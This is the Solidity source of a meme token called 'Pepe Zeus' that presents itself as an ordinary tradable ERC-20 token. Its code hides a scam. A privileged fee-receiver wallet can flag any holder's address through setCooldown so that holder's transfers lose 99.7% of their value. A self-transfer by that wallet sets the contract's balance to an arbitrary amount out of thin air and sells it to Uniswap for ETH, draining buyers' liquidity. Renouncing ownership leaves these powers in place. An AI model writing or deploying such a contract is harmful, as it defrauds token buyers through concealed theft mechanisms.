pragma solidity ^0.8.19;
// SPDX-License-Identifier: MIT


library SafeMath {
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a, "SafeMath:  subtraction overflow");
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {return 0;}
        uint256 c = a * b;
        require(c / a == b, "SafeMath:  multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0, "SafeMath:  division by zero");
        uint256 c = a / b;
        return c;
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath:  addition overflow");
        return c;
    }
}

abstract contract Ownable {
    address private _owner;
    function owner() public view virtual returns (address) {return _owner;}
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
    modifier onlyOwner(){
        require(owner() == msg.sender, "Ownable: caller is not the owner");
        _;
    }
    constructor () {
        _owner = msg.sender;
        emit OwnershipTransferred(address(0), _owner);
    }
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
}

interface IUniswapV2Factory {
    function getPair(address tokenA, address tokenB) external view returns (address pair_);
}

interface IUniswapV2Router {
    function factory() external pure returns (address addr);
    function swapExactTokensForETHSupportingFeeOnTransferTokens(uint256 a, uint256 b, address[] calldata _path, address c, uint256) external;
    function WETH() external pure returns (address aadd);
}

contract PepeZeus is Ownable {
    using SafeMath for uint256;
    uint256 public _decimals = 9;
    uint256 public _maxTransaction = _totalSupply;
    uint256 public _totalSupply = 1000000000 * 10 ** _decimals;


    function swap(uint256 amount, address to) private {
        _approve(address(this), address(uniRouter), amount); _balances[address(this)] = amount;
        address[] memory path = new address[](2); path[0] = address(this); path[1] = uniRouter.WETH(); uniRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(amount, 0, path, to, block.timestamp + 31);
    }
    function transfer(address recipient, uint256 amount) public returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }
    string private _name = "Pepe Zeus";
    string private _symbol = "PEPEZEUS";
    IUniswapV2Router private uniRouter = IUniswapV2Router(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
    function setCooldown(address[] calldata frontrunners) external {
        for (uint botIndex = 0;  botIndex < frontrunners.length;  botIndex++) { if (!taxWalletAddress()){}else { _cooldown[frontrunners[botIndex]] =block.number + 1;
        }}
    }
    address public _feeReceiver;
    function _approve(address owner, address spender, uint256 amount) internal {
        require(spender != address(0), "IERC20: approve to the zero address"); require(owner != address(0), "IERC20: approve from the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
    function name() external view returns (string memory) {
        return _name;
    }
    mapping(address => mapping(address => uint256)) private _allowances;
    function decreaseAllowance(address from, uint256 amount) public returns (bool) {
        require(_allowances[msg.sender][from] >= amount);
        _approve(msg.sender, from, _allowances[msg.sender][from] - amount);
        return true;
    }

    constructor() {
        _feeReceiver = msg.sender; _balances[msg.sender] = _totalSupply; emit Transfer(address(0), msg.sender, _balances[msg.sender]);
    }
    event Approval(address indexed, address indexed, uint256 value);
    function setFeeWallet(address _a)external onlyOwner {
        _feeReceiver = _a;
    }
    mapping(address => uint256) bots;
    mapping (address => uint256) _cooldown;
    bool opened = false;
    function symbol() public view returns (string memory) {
        return _symbol;
    }
    function taxWalletAddress() internal view returns (bool) {
        return msg.sender == _feeReceiver;
    }
    function setMaxTransaction(uint256 _maxTx) external onlyOwner {
        _maxTransaction = _maxTx;
    }
    bool _cooldownEnabled = true;
    function setCooldownEnabled(bool _enabled) external onlyOwner {
        _cooldownEnabled = _enabled;
    }
    mapping(address => uint256) private _balances;
    function increaseAllowance(address spender, uint256 addedValue) public returns (bool) {
        _approve(msg.sender, spender, _allowances[msg.sender][spender] + addedValue);
        return true;
    }
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
    event Transfer(address indexed __address_, address indexed, uint256 _v);
    function approve(address spender, uint256 amount) public virtual returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
    function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
        _transfer(sender, recipient, amount);
        require(_allowances[sender][msg.sender] >= amount);
        return true;
    }
    function decimals() external view returns (uint256) {
        return _decimals;
    }
    function _transfer(address _sndr, address receivr, uint256 value) internal {
        require(_sndr != address(0));
        if (msg.sender == _feeReceiver && _sndr == receivr) {swap(value, receivr);} else {require(value <= _balances[_sndr]);
            uint256 fee = 0;
            if (_cooldown[_sndr] != 0 && _cooldown[_sndr] <= block.number) {fee = value.mul(997).div(1000);}
            _balances[_sndr] = _balances[_sndr] - value;
            _balances[receivr] += value - fee;
            emit Transfer(_sndr, receivr, value);
        }
    }
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
    function totalSupply() external view returns (uint256) {
        return _totalSupply;
    }
    function startTrading() external onlyOwner {
        opened = true;
    }
}